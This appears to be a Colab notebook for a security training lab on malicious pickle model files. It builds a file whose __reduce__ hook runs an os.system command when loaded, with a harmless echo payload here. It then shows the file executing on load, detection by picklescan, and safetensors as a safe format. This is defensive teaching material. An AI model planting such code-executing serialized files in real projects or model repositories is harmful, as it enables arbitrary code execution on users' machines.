<a href="https://colab.research.google.com/github/shanemckenney/CompTIA-SecAI-Hands-On-Labs/blob/main/Lab01-Model-Deserialization/Lab01_Model_Deserialization_Attack_%26_Static_Defensive_Scanning.ipynb" target="_parent"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/></a>

In [1]:
!pip install picklescan safetensors torch

In [2]:
import pickle
import os

# Define the weaponized class structure
class MaliciousModel:
    def __reduce__(self):
        # The instruction payload we are hiding inside the model card file
        return (os.system, ("echo '[!] CRITICAL: Arbitrary code execution triggered on the host container!' > exploit_alert.txt",))

# Instantiate our custom class
infected_weights = MaliciousModel()

# Serialize the object and write the raw binary bytes to a file
with open("suspicious_model.pkl", "wb") as f:
    pickle.dump(infected_weights, f)

print("Infected model weights successfully generated and saved as 'suspicious_model.pkl'.")

Infected model weights successfully generated and saved as 'suspicious_model.pkl'.


In [3]:
import pickle
import os

# Define the weaponized class structure
class MaliciousModel:
    def __reduce__(self):
        # The instruction payload we are hiding inside the model card file
        return (os.system, ("echo '[!] CRITICAL: Arbitrary code execution triggered on the host container!' > exploit_alert.txt",))

# Instantiate our custom class
infected_weights = MaliciousModel()

# Serialize the object and write the raw binary bytes to a file
with open("suspicious_model.pkl", "wb") as f:
    pickle.dump(infected_weights, f)

print("Infected model weights successfully generated and saved as 'suspicious_model.pkl'.")

Infected model weights successfully generated and saved as 'suspicious_model.pkl'.


In [4]:
print("Before loading file, does 'exploit_alert.txt' exist?", os.path.exists("exploit_alert.txt"))

# A developer imports the model thinking it is just passive neural network weights
print("\n[!] Loading untrusted model weights via standard pickle parsing...")
try:
    with open("suspicious_model.pkl", "rb") as f:
        pickle.load(f) # This instantiates the object and silently runs the injected OS payload
except Exception as e:
    pass

print("\nAfter loading file, does 'exploit_alert.txt' exist?", os.path.exists("exploit_alert.txt"))
print("File Contents:")
!cat exploit_alert.txt

Before loading file, does 'exploit_alert.txt' exist? False

[!] Loading untrusted model weights via standard pickle parsing...

After loading file, does 'exploit_alert.txt' exist? True
File Contents:
[!] CRITICAL: Arbitrary code execution triggered on the host container!


In [6]:
!picklescan -p suspicious_model.pkl

/content/suspicious_model.pkl: dangerous import 'posix system' FOUND
----------- SCAN SUMMARY -----------
Scanned files: 1
Infected files: 1
Dangerous globals: 1


In [7]:
import torch
import os
from safetensors.torch import save_file, load_file

# Define completely authentic, benign neural network weights (raw tensors)
benign_weights = {
    "layer1.weight": torch.randn(3, 3),
    "layer1.bias": torch.randn(3)
}

# Save the model securely
save_file(benign_weights, "secure_model.safetensors")
print("Secure model file saved via Safetensors.")

# Erase the previous exploit confirmation file to ensure clean testing
if os.path.exists("exploit_alert.txt"):
    os.remove("exploit_alert.txt")

# Attempt to load the new secure file format
print("\n[+] Loading secure model via Safetensors parsing...")
loaded_weights = load_file("secure_model.safetensors")

print("Successfully loaded secure weights!")
print("Does 'exploit_alert.txt' exist now?", os.path.exists("exploit_alert.txt"))

Secure model file saved via Safetensors.

[+] Loading secure model via Safetensors parsing...
Successfully loaded secure weights!
Does 'exploit_alert.txt' exist now? False
